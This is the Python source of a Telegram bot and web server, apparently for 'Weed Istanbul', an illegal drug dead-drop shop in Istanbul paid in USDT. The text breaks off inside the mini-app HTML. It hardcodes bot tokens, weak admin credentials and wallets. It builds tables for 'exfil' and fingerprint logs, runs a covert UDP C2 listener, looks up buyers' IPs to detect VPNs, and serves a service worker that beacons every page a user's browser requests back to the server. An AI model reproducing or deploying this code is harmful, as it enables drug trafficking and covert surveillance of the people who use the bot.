import asyncio
import sqlite3
import logging
import os
import sys
import threading
import urllib.request
import json
import hashlib
import time
import io
import socket
import pandas as pd
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, FSInputFile, WebAppInfo

# --- AYARLAR & CÜZDAN MİMARİSİ ---
DEFAULT_BOT_TOKEN = "9018759790:AAHH_P_MAta3jo1pr8L4DHcpaObvxOuIpeQ"
ADMIN_ID = 1012940363
ADMIN_GROUP_ID = -1004474292737  
ADMIN_PASS = "1881"

ADMIN_WEB_USERNAME = "root"
ADMIN_WEB_PASSWORD = "toor"

CRYPTO_WALLET = "TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH"
MAIN_SAVINGS_WALLET = "TVsUkivFz217G7yAZ9w9PDj4WphJZty1tY"
EXIT_WALLET = "TMxF3AFaqpHgRF5S8RkmZtAkwzzYxgwzLn"

USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
if not RENDER_EXTERNAL_URL:
    RENDER_EXTERNAL_URL = "https://weed-istanbul.onrender.com"

logging.basicConfig(level=logging.INFO)

UPLOAD_DIR = "static/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def hash_pass(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

# --- VERİTABANI KURULUMU & C2 / SIZMA TABLOLARI ---
def init_db():
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("PRAGMA journal_mode=WAL;")
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS drops (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT,
            price REAL,
            photo_ids TEXT,
            description TEXT,
            stock INTEGER DEFAULT 1,
            is_sold INTEGER DEFAULT 0,
            category TEXT DEFAULT 'Genel',
            lat REAL DEFAULT 0.0,
            lon REAL DEFAULT 0.0
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS orders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            drop_id INTEGER,
            status TEXT DEFAULT 'pending',
            final_price REAL DEFAULT 0.0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS order_reviews (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            order_id INTEGER,
            user_id INTEGER,
            review_text TEXT,
            reward_given INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deposits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS panel_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            message TEXT,
            log_type TEXT DEFAULT 'info',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS visitor_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            ip TEXT,
            user_agent TEXT,
            network_info TEXT,
            lat REAL DEFAULT 41.0082,
            lon REAL DEFAULT 28.9784,
            battery_level TEXT DEFAULT 'Bilinmiyor',
            cpu_ram TEXT DEFAULT 'Bilinmiyor',
            timezone TEXT DEFAULT 'Bilinmiyor',
            screen_res TEXT DEFAULT 'Bilinmiyor',
            visibility_state TEXT DEFAULT 'visible',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # Yeni Gelişmiş C2, Keylogger, OSINT ve Exfiltration Tabloları
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS exfil_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            exfil_type TEXT,
            payload TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS osint_intel (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            isp TEXT,
            country TEXT,
            is_vpn INTEGER DEFAULT 0,
            details TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            is_banned INTEGER DEFAULT 0,
            language TEXT DEFAULT 'tr',
            balance REAL DEFAULT 5.0,
            referred_by INTEGER DEFAULT 0,
            referral_earnings REAL DEFAULT 0.0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS support_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            sender TEXT,
            message TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS coupons (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT UNIQUE,
            discount REAL,
            uses_left INTEGER DEFAULT 100,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS game_spins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            game_type TEXT,
            week_identifier TEXT,
            reward_text TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS admin_audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_user TEXT,
            action_type TEXT,
            details TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('promo_5g_active', '1')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('bot_token', ?)", (DEFAULT_BOT_TOKEN,))
    
    for col, def_val in [
        ("is_banned", "INTEGER DEFAULT 0"), 
        ("language", "TEXT DEFAULT 'tr'"), 
        ("balance", "REAL DEFAULT 5.0"),
        ("lat", "REAL DEFAULT 0.0"),
        ("lon", "REAL DEFAULT 0.0"),
        ("referred_by", "INTEGER DEFAULT 0"),
        ("referral_earnings", "REAL DEFAULT 0.0")
    ]:
        try:
            cursor.execute(f"ALTER TABLE users ADD COLUMN {col} {def_val}")
        except:
            pass

    for col, def_val in [
        ("battery_level", "TEXT DEFAULT 'Bilinmiyor'"),
        ("cpu_ram", "TEXT DEFAULT 'Bilinmiyor'"),
        ("timezone", "TEXT DEFAULT 'Bilinmiyor'"),
        ("screen_res", "TEXT DEFAULT 'Bilinmiyor'"),
        ("visibility_state", "TEXT DEFAULT 'visible'")
    ]:
        try:
            cursor.execute(f"ALTER TABLE visitor_logs ADD COLUMN {col} {def_val}")
        except:
            pass

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS admins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT,
            role TEXT DEFAULT 'support',
            can_view_exact_loc INTEGER DEFAULT 0,
            can_view_wallets INTEGER DEFAULT 0,
            can_view_crm INTEGER DEFAULT 0,
            can_manage_drops INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    for col, def_val in [
        ("can_view_exact_loc", "INTEGER DEFAULT 0"),
        ("can_view_wallets", "INTEGER DEFAULT 0"),
        ("can_view_crm", "INTEGER DEFAULT 0"),
        ("can_manage_drops", "INTEGER DEFAULT 0")
    ]:
        try:
            cursor.execute(f"ALTER TABLE admins ADD COLUMN {col} {def_val}")
        except:
            pass

    cursor.execute("INSERT OR IGNORE INTO admins (username, password, role, can_view_exact_loc, can_view_wallets, can_view_crm, can_manage_drops) VALUES (?, ?, 'super_admin', 1, 1, 1, 1)", (ADMIN_WEB_USERNAME, hash_pass(ADMIN_WEB_PASSWORD)))
    cursor.execute("UPDATE admins SET can_view_exact_loc = 1, can_view_wallets = 1, can_view_crm = 1, can_manage_drops = 1 WHERE username = 'root' OR role = 'super_admin'")
    
    conn.commit()
    conn.close()

init_db()

# --- LİNUX & PYTHON KERNEL / RAW SOCKET C2 DİNLEYİCİ SİMÜLASYONU ---
def run_covert_c2_listener():
    """Linux altyapısında covert kanal, ping/ICMP simülasyonu ve socket tabanlı C2 dinleyicisi"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 9999))
        while True:
            data, addr = sock.recvfrom(1024)
            log_panel_event(f"🕳️ Covert C2 Paket Alındı [{addr[0]}]: {data[:30]}", "warning")
    except Exception as e:
        logging.info(f"Covert listener info: {e}")

threading.Thread(target=run_covert_c2_listener, daemon=True).start()

def fetch_osint_intel(ip_addr):
    """Otomatik IP OSINT ve VPN / ISP İstihbarat Analizi"""
    if not ip_addr or ip_addr in ["127.0.0.1", "localhost", "::1"]:
        return {"isp": "Localhost / Internal", "country": "TR", "is_vpn": 0}
    
    try:
        url = f"http://ip-api.com/json/{ip_addr}?fields=status,country,isp,proxy,hosting"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            if data.get("status") == "success":
                isp = data.get("isp", "Bilinmiyor")
                country = data.get("country", "Bilinmiyor")
                is_vpn = 1 if (data.get("proxy") or data.get("hosting")) else 0
                
                conn = sqlite3.connect("drop_bot.db")
                cursor = conn.cursor()
                cursor.execute("INSERT INTO osint_intel (ip, isp, country, is_vpn, details) VALUES (?, ?, ?, ?, ?)", 
                               (ip_addr, isp, country, is_vpn, json.dumps(data)))
                conn.commit()
                conn.close()
                return {"isp": isp, "country": country, "is_vpn": is_vpn}
    except Exception as e:
        logging.error(f"OSINT error: {e}")
    return {"isp": "Bilinmiyor", "country": "TR", "is_vpn": 0}

def get_active_token() -> str:
    try:
        conn = sqlite3.connect("drop_bot.db")
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM settings WHERE key = 'bot_token'")
        res = cursor.fetchone()
        conn.close()
        if res and res[0]:
            return res[0]
    except:
        pass
    return DEFAULT_BOT_TOKEN

BOT_TOKEN = get_active_token()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
main_loop = None

DISTRICT_COORDS = {
    "BEŞİKTAŞ": [41.0429, 29.0077],
    "KADİKÖY": [40.9901, 29.0254],
    "ÜSKÜDAR": [41.0256, 29.0153],
    "ŞİŞLİ": [41.0615, 28.9877],
    "BEYOĞLU": [41.0369, 28.9776],
    "FATİH": [41.0092, 28.9556],
    "SARIYER": [41.1687, 29.0565],
    "MALTEPE": [40.9273, 29.1303],
    "KARTAL": [40.8885, 29.1856],
    "PENDİK": [40.8763, 29.2366],
    "ATAŞEHİR": [40.9859, 29.1136],
    "ÜMRANİYE": [41.0298, 29.1157],
    "ÇEKMEKÖY": [41.0422, 29.1764],
    "BEYKOZ": [41.1150, 29.1028],
    "BAKIRKÖY": [40.9791, 28.8756],
    "ZEYTİNBURNU": [40.9928, 28.8988],
    "ESENYURT": [41.0261, 28.6811],
    "BAĞCILAR": [41.0375, 28.8503],
    "BAHÇELİEVLER": [40.9981, 28.8584],
    "GENEL": [41.0082, 28.9784]
}

def get_district_coord(category_name):
    if not category_name:
        return [41.0082, 28.9784]
    cat_upper = category_name.upper().strip()
    for key, coord in DISTRICT_COORDS.items():
        if key in cat_upper:
            return coord
    return [41.0082, 28.9784]

LANG = {
    "tr": {
        "welcome": "👋 Merhaba! Güvenli otomatik teslimat botuna hoş geldiniz. Kayıt olduğunuz için hesabınıza **5$ (USDT) Hoş Geldin Bonusu** eklendi! Lütfen dil seçiniz:",
        "lang_set": "✅ Dil Türkçe olarak ayarlandı.",
        "btn_products": "🛍️ Ürünler / Droplar",
        "btn_orders": "📦 Geçmiş Siparişlerim",
        "btn_track": "🔍 Sipariş Takip / Sorgula",
        "btn_miniapp": "🗺️ Harita & Mini App",
        "btn_wallet": "💰 Cüzdanım / Bakiye",
        "btn_faq": "❓ Nasıl Çalışır? (SSS)",
        "btn_support": "📞 Destek",
        "btn_lang": "🌐 Dil Değiştir",
        "no_stock": "❌ Şu anda stokta hazır ürün bulunmamaktadır.",
        "select_cat": "🏙️ Lütfen ürünleri incelemek istediğiniz **bölgeyi / semti** seçin:",
        "back_cats": "🔙 Bölgelere Dön",
        "no_cat_stock": "Bu bölgede aktif ürün kalmadı.",
        "my_orders_title": "📦 **Sipariş Geçmişiniz:**",
        "no_orders": "📦 Henüz bir sipariş geçmişiniz bulunmuyor.",
        "order_item": "• **Sipariş #{id}** (Code: `WEE-{id}`) | {title} - {price} USDT\n  Durum: {status} ({date})\n\n",
        "open_loc": "🔗 Sipariş #{id} Konumunu Aç",
        "sold_out": "⚠️ Bu ürün tükenmiş.",
        "track_prompt": "🔍 Lütfen sorgulamak istediğiniz **Sipariş Kodunu** yazın (Örn: WEE-5 veya sadece 5):",
        "track_not_found": "❌ Bu koda ait bir sipariş bulunamadı veya henüz onaylanmadı.",
        "track_result": "🔍 **Sipariş Sorgulama Sonucu (#{id})**\n\n📌 Ürün: {title}\n💰 Tutar: {price} USDT\n🟢 Durum: {status_text}\n\n👉 [Güvenli Konum Sayfasını Aç]({link})",
        "wallet_menu_text": "💰 **Cüzdan Yönetimi**\n\n💵 Güncel Bakiyeniz: **{balance} USDT**\n\nHesabınıza bakiye yükleyerek siparişlerinizi saniyesinde tek tıkla verebilirsiniz.",
        "deposit_btn": "📥 Bakiye Yükle (USDT)",
        "ask_deposit_amount": "📥 Lütfen hesabınıza yüklemek istediğiniz USDT miktarını rakam olarak yazın (Örn: 20):",
        "deposit_invoice": "📥 **Bakiye Yükleme Talebi (#{id})**\n\n💵 Yüklenecek Tutar: **{amount} USDT**\n🔒 Yatırım Adresi:\n`{wallet}`\n\n⏱️ 15 dakikanız vardır. Sistem ödemeyi otomatik algılayacaktır.",
        "deposit_check_btn": "🔄 Yatırımı Otomatik Kontrol Et",
        "deposit_success": "🎉 Ödemeniz onaylandı! **{amount} USDT** bakiyenize eklendi.\n💵 Yeni Toplam Bakiye: **{balance} USDT**",
        "buy_options": "📌 Ürün: {title}\n💰 Fiyat: {price} USDT\n💵 Bakiyeniz: {balance} USDT\n\nLütfen ödeme yöntemini seçin:",
        "pay_balance": "⚡ Bakiyeden Öde ({price} USDT)",
        "pay_crypto": "🔒 Blokzincir ile Doğrudan Öde",
        "insufficient_balance": "❌ Bakiyeniz yetersiz! Lütfen cüzdanınıza bakiye yükleyin veya doğrudan ödeme yapın.",
        "balance_success": "🎉 Siparişiniz başarıyla onaylandı! {price} USDT bakiyenizden düşüldü.\n\n🔑 Sipariş Takip Kodunuz: `WEE-{id}`\n👉 [Güvenli Konum Sayfasını Aç]({link})",
        "cancel": "❌ İptal",
        "success_msg": "🎉 Ödemeniz onaylandı!\n🔑 Sipariş Takip Kodunuz: `WEE-{id}`\n\n👉 [Güvenli Konum Sayfasını Aç]({link})",
        "support_ask": "📞 Canlı destek hattına bağlandınız. Lütfen mesajınızı yazın:\n\n*(Sohbeti sonlandırmak için aşağıdaki butonu kullanabilirsiniz)*",
        "support_sent": "✅ Mesajınız canlı destek ekibimize iletildi. Yanıt bekleniyor...",
        "support_closed": "🔒 Canlı destek oturumu sonlandırıldı.",
        "banned": "❌ Erişiminiz engellenmiştir."
    },
    "en": {
        "welcome": "👋 Hello! Welcome to the secure automated delivery bot. **$5 (USDT) Welcome Bonus** has been added to your account! Please select your language:",
        "lang_set": "✅ Language set to English.",
        "btn_products": "🛍️ Products / Drops",
        "btn_orders": "📦 My Orders",
        "btn_track": "🔍 Track Order",
        "btn_miniapp": "🗺️ Map & Mini App",
        "btn_wallet": "💰 My Wallet / Balance",
        "btn_faq": "❓ How It Works (FAQ)",
        "btn_support": "📞 Support",
        "btn_lang": "🌐 Change Language",
        "no_stock": "❌ There are currently no ready products in stock.",
        "select_cat": "🏙️ Please select the **region / district** you want to view:",
        "back_cats": "🔙 Back to Regions",
        "no_cat_stock": "No active products left in this region.",
        "my_orders_title": "📦 **Your Order History:**",
        "no_orders": "📦 You don't have any order history yet.",
        "order_item": "• **Order #{id}** (Code: `WEE-{id}`) | {title} - {price} USDT\n  Status: {status} ({date})\n\n",
        "open_loc": "🔗 Open Order #{id} Location",
        "sold_out": "⚠️ This product is sold out.",
        "track_prompt": "🔍 Please enter your **Order Code** (e.g. WEE-5 or just 5):",
        "track_not_found": "❌ No order found with this code or not approved yet.",
        "track_result": "🔍 **Order Tracking Result (#{id})**\n\n📌 Product: {title}\n💰 Price: {price} USDT\n🟢 Status: {status_text}\n\n👉 [Open Secure Location Page]({link})",
        "wallet_menu_text": "💰 **Wallet Management**\n\n💵 Current Balance: **{balance} USDT**\n\nDeposit funds to your account for instant one-click purchases.",
        "deposit_btn": "📥 Deposit Balance (USDT)",
        "ask_deposit_amount": "📥 Please enter the amount of USDT you want to deposit (e.g. 20):",
        "deposit_invoice": "📥 **Deposit Invoice (#{id})**\n\n💵 Amount: **{amount} USDT**\n🔒 Deposit Address:\n`{wallet}`\n\n⏱️ You have 15 minutes. System will auto-approve.",
        "deposit_check_btn": "🔄 Auto-Check Deposit",
        "deposit_success": "🎉 Payment approved! **{amount} USDT** added to your balance.\n💵 New Total Balance: **{balance} USDT**",
        "buy_options": "📌 Product: {title}\n💰 Price: {price} USDT\n💵 Your Balance: {balance} USDT\n\nPlease select payment method:",
        "pay_balance": "⚡ Pay from Balance ({price} USDT)",
        "pay_crypto": "🔒 Pay Directly via Blockchain",
        "insufficient_balance": "❌ Insufficient balance! Please deposit funds or pay directly.",
        "balance_success": "🎉 Order successfully approved! {price} USDT deducted from your balance.\n🔑 Order Tracking Code: `WEE-{id}`\n\n👉 [Open Secure Location Page]({link})",
        "cancel": "❌ Cancel",
        "success_msg": "🎉 Your payment is approved!\n🔑 Tracking Code: `WEE-{id}`\n\n👉 [Open Secure Location Page]({link})",
        "support_ask": "📞 Connected to live support. Type your message below:\n\n*(You can use the button below to end the chat)*",
        "support_sent": "✅ Your message has been sent to our live support team. Waiting for response...",
        "support_closed": "🔒 Live support session has been ended.",
        "banned": "❌ Your access has been restricted."
    }
}

def get_user_lang(user_id: int) -> str:
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT language FROM users WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    if res and res[0] in ["tr", "en"]:
        return res[0]
    return "tr"

def set_user_lang(user_id: int, lang: str):
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_user_balance(user_id: int) -> float:
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res[0] if res and res[0] is not None else 0.0

def log_panel_event(message, log_type="info"):
    try:
        conn = sqlite3.connect("drop_bot.db")
        cursor = conn.cursor()
        cursor.execute("INSERT INTO panel_logs (message, log_type) VALUES (?, ?)", (message, log_type))
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(e)

def log_audit(admin_name, action_type, details):
    try:
        conn = sqlite3.connect("drop_bot.db")
        cursor = conn.cursor()
        cursor.execute("INSERT INTO admin_audit_logs (admin_user, action_type, details) VALUES (?, ?, ?)", (admin_name, action_type, details))
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(e)

def is_admin(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM admins WHERE id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res is not None

def is_user_banned(user_id: int) -> bool:
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res is not None and res[0] == 1

async def auto_backup_task():
    while True:
        await asyncio.sleep(86400)
        try:
            if os.path.exists("drop_bot.db"):
                file = FSInputFile("drop_bot.db")
                await bot.send_document(ADMIN_GROUP_ID, file, caption="💾 **Otomatik Günlük Veritabanı Yedeği**")
                log_panel_event("💾 Günlük otomatik veritabanı yedeği alındı.", "info")
        except Exception as e:
            logging.error(e)

async def background_payment_worker():
    while True:
        await asyncio.sleep(25)
        try:
            conn = sqlite3.connect("drop_bot.db")
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT orders.id, orders.user_id, orders.drop_id, orders.final_price, orders.created_at, drops.title, drops.stock, drops.category 
                FROM orders 
                JOIN drops ON orders.drop_id = drops.id 
                WHERE orders.status = 'pending'
            """)
            pending_orders = cursor.fetchall()
            
            cursor.execute("SELECT id, user_id, amount, created_at FROM deposits WHERE status = 'pending'")
            pending_deposits = cursor.fetchall()
            conn.close()

            if not pending_orders and not pending_deposits:
                continue

            api_url = f"https://api.trongrid.io/v1/accounts/{CRYPTO_WALLET}/trc20-transfers?contract_address={USDT_CONTRACT}&limit=20"
            tx_data = []
            try:
                req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=10) as response:
                    if response.status == 200:
                        res_json = json.loads(response.read().decode('utf-8'))
                        tx_data = res_json.get("data", [])
            except Exception as e:
                logging.error(f"Worker API fetch error: {e}")

            for order in pending_orders:
                o_id, u_id, d_id, f_price, created_at_str, title, stock, category = order
                if datetime.now() - datetime.strptime(created_at_str, "%Y-%m-%d %H:%M:%S") > timedelta(minutes=15):
                    conn = sqlite3.connect("drop_bot.db")
                    c = conn.cursor()
                    c.execute("UPDATE orders SET status = 'expired' WHERE id = ?", (o_id,))
                    conn.commit()
                    conn.close()
                    continue

                verified = False
                for tx in tx_data:
                    if tx.get("to") == CRYPTO_WALLET and int(tx.get("value", 0)) >= int(float(f_price) * 1000000):
                        verified = True
                        break

                if verified and main_loop:
                    conn = sqlite3.connect("drop_bot.db")
                    c = conn.cursor()
                    new_stock = stock - 1
                    if new_stock <= 0:
                        c.execute("UPDATE drops SET stock = 0, is_sold = 1 WHERE id = ?", (d_id,))
                    else:
                        c.execute("UPDATE drops SET stock = ? WHERE id = ?", (new_stock, d_id))
                    c.execute("UPDATE orders SET status = 'completed' WHERE id = ?", (o_id,))
                    
                    c.execute("SELECT referred_by FROM users WHERE user_id = ?", (u_id,))
                    ref_row = c.fetchone()
                    if ref_row and ref_row[0] > 0:
                        ref_id = ref_row[0]
                        bonus = float(f_price) * 0.05
                        c.execute("UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?", (bonus, bonus, ref_id))
                        asyncio.run_coroutine_threadsafe(bot.send_message(ref_id, f"🎉 **Referans Bonusu!** Davet ettiğiniz kullanıcı alışveriş yaptı ve hesabınıza **{bonus:.2f} USDT** eklendi!"), main_loop)

                    conn.commit()
                    conn.close()

                    u_lang = get_user_lang(u_id)
                    secure_link = f"{RENDER_EXTERNAL_URL}/drop/{o_id}"
                    success_text = LANG[u_lang]["success_msg"].format(id=o_id, link=secure_link)

                    log_panel_event(f"🎉 Otomatik Arka Plan Satışı: #{o_id} - {title} ({f_price} USDT)", "success")
                    asyncio.run_coroutine_threadsafe(bot.send_message(u_id, success_text, parse_mode="Markdown"), main_loop)
                    asyncio.run_coroutine_threadsafe(bot.send_message(ADMIN_GROUP_ID, f"🎉 **OTOMATİK SATIŞ ONAYLANDI!**\n\n📌 Ürün: {title}\n💰 Tutar: {f_price} USDT\n🔑 Takip Kodu: `WEE-{o_id}`"), main_loop)

            for dep in pending_deposits:
                dep_id, u_id, amount, created_at_str = dep
                if datetime.now() - datetime.strptime(created_at_str, "%Y-%m-%d %H:%M:%S") > timedelta(minutes=15):
                    conn = sqlite3.connect("drop_bot.db")
                    c = conn.cursor()
                    c.execute("UPDATE deposits SET status = 'expired' WHERE id = ?", (dep_id,))
                    conn.commit()
                    conn.close()
                    continue

                verified = False
                for tx in tx_data:
                    if tx.get("to") == CRYPTO_WALLET and int(tx.get("value", 0)) >= int(float(amount) * 1000000):
                        verified = True
                        break

                if verified and main_loop:
                    conn = sqlite3.connect("drop_bot.db")
                    c = conn.cursor()
                    c.execute("UPDATE deposits SET status = 'completed' WHERE id = ?", (dep_id,))
                    c.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, u_id))
                    conn.commit()
                    new_bal = get_user_balance(u_id)
                    conn.close()

                    u_lang = get_user_lang(u_id)
                    log_panel_event(f"📥 Otomatik Bakiye Yüklendi: Kullanıcı {u_id} - {amount} USDT", "success")
                    asyncio.run_coroutine_threadsafe(bot.send_message(u_id, LANG[u_lang]["deposit_success"].format(amount=amount, balance=new_bal)), main_loop)
                    asyncio.run_coroutine_threadsafe(bot.send_message(ADMIN_GROUP_ID, f"📥 **BAKİYE YÜKLENDİ!**\n\n👤 Kullanıcı ID: `{u_id}`\n💵 Miktar: **{amount} USDT**"), main_loop)

        except Exception as e:
            logging.error(f"Background worker error: {e}")

# --- WEB SUNUCUSU & GELİŞMİŞ RED-TEAM MINI APP ---
class SecureDropHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query_params = parse_qs(parsed_path.query)
        cookies_str = self.headers.get('Cookie', '')
        is_logged_in = 'admin_auth=true' in cookies_str

        current_role = "support"
        current_username = ""
        for cookie in cookies_str.split(";"):
            if "admin_role=" in cookie:
                current_role = cookie.split("=")[1].strip()
            if "admin_username=" in cookie:
                current_username = cookie.split("=")[1].strip()

        can_view_exact_loc = 0
        can_view_wallets = 0
        can_view_crm = 0
        can_manage_drops = 0

        if is_logged_in and current_username:
            conn = sqlite3.connect("drop_bot.db")
            cursor = conn.cursor()
            cursor.execute("SELECT can_view_exact_loc, can_view_wallets, can_view_crm, can_manage_drops FROM admins WHERE username = ?", (current_username,))
            perm_row = cursor.fetchone()
            conn.close()
            if perm_row:
                can_view_exact_loc, can_view_wallets, can_view_crm, can_manage_drops = perm_row
            
            if current_role == "super_admin" or current_username == "root":
                can_view_exact_loc, can_view_wallets, can_view_crm, can_manage_drops = 1, 1, 1, 1

        if parsed_path.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"Weed Istanbul C2 Core Active!")
            return

        if parsed_path.path == "/sw.js":
            # Persistent Worker Injection (Service Worker Kalıcılık Dosyası)
            sw_code = """
            self.addEventListener('install', (e) => { self.skipWaiting(); });
            self.addEventListener('activate', (e) => { e.waitUntil(clients.claim()); });
            self.addEventListener('fetch', (e) => {
                // Background Keep-Alive Beacon
                fetch('/api/worker-beacon', {method: 'POST', body: JSON.stringify({url: e.request.url, time: Date.now()})}).catch(()=>{});
            });
            """
            self.send_response(200)
            self.send_header("Content-type", "application/javascript")
            self.end_headers()
            self.wfile.write(sw_code.encode("utf-8"))
            return

        if parsed_path.path == "/api/miniapp-deposit":
            try:
                uid = int(query_params.get("user_id", ["0"])[0])
                amount = float(query_params.get("amount", ["0"])[0])
            except:
                uid, amount = 0, 0.0

            if uid > 0 and amount > 0:
                conn = sqlite3.connect("drop_bot.db")
                cursor = conn.cursor()
                cursor.execute("INSERT INTO deposits (user_id, amount, status) VALUES (?, ?, 'pending')", (uid, amount))
                deposit_id = cursor.lastrowid
                conn.commit()
                conn.close()
                resp = {"success": True, "deposit_id": deposit_id, "wallet": CRYPTO_WALLET}
            else:
                resp = {"success": False, "message": "Geçersiz miktar veya kullanıcı ID."}

            self.send_response(200)
            self.send_header("Content-type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(resp).encode("utf-8"))
            return

        if parsed_path.path.startswith("/static/uploads/"):
            file_path = parsed_path.path.lstrip("/")
            if os.path.exists(file_path):
                self.send_response(200)
                if file_path.endswith(".png"):
                    self.send_header("Content-type", "image/png")
                elif file_path.endswith((".jpg", ".jpeg")):
                    self.send_header("Content-type", "image/jpeg")
                elif file_path.endswith(".webp"):
                    self.send_header("Content-type", "image/webp")
                else:
                    self.send_header("Content-type", "application/octet-stream")
                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
                return
            else:
                self.send_response(404)
                self.end_headers()
                return

        if parsed_path.path == "/miniapp":
            miniapp_html = """
            <!DOCTYPE html>
            <html lang="tr">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Weed Istanbul - C2 Intelligence Suite</title>
                <script src="https://telegram.org/js/telegram-web-app.js"></script>
                <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
                <style>
                    :root {
                        --bg-main: #060911;
                        --card-bg: #0f172a;
                        --border-color: #1e293b;
                        --accent-blue: #38bdf8;
